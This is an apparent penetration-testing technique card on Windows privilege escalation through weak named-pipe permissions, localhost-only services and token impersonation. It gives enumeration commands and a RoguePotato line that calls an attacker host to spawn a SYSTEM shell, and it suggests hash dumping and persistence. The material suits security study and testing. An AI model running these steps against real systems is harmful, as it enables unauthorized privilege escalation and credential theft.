### Technique Name:

Communication with Processes (Named Pipes, Network Services, and Access Tokens)
### Summary:

Processes on Windows systems may expose communication channels that can be abused to gain elevated privileges. This includes:
1. Network services that are bound to loopback-only addresses (127.0.0.1 or ::1) and listen on sensitive ports.
2. Named pipes with insecure permissions that allow any user to read or write to them.
3. Services running with impersonation privileges that can be exploited via tools like RoguePotato or PrintSpoofer.

These channels can leak credentials, allow code injection, or be used to impersonate higher-privileged users (SYSTEM).
### Conditions:

- Attacker must have code execution as a low-privileged user
- One or more of the following:
  - Exposed named pipe with weak ACLs
  - Network service bound to localhost with no authentication
  - SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege available
- Tools like `accesschk`, `pipelist`, or PowerShell must be usable on the host
### Enumeration:

```powershell
# List all open TCP/UDP connections and associated PIDs
netstat -ano

# Match PIDs to process names
tasklist /fi "PID eq <PID>"

# List named pipes using Sysinternals
pipelist.exe /accepteula

# Or list named pipes using PowerShell
gci \\.\pipe\

# Check named pipe permissions (DACL)
accesschk.exe /accepteula \\.\pipe\<pipe_name> -v

# Find writable pipes
accesschk.exe -accepteula -w \\.\pipe\* -v
```
### Exploitation:

```powershell
# Identify pipes with weak permissions (e.g., WindscribeService)
accesschk.exe -accepteula -w \\.\pipe\WindscribeService -v

# If SeImpersonatePrivilege is available, exploit with RoguePotato
.\RoguePotato.exe -r <attacker_ip> -e cmd.exe -l 9999

# If the service (e.g. FileZilla) listens on localhost only
curl http://127.0.0.1:14147  # connect locally to admin panel

# Interact with Named Pipes manually using tools or custom scripts
```
### Post-Exploitation:

* Use SYSTEM shell to dump hashes (SAM, LSA, LSASS)
* Identify and close insecure named pipes
* Document exposed ports and escalate findings to blue team
* Consider persistence via service creation or user addition
* If red team op, report improper Named Pipe ACLs as critical findings
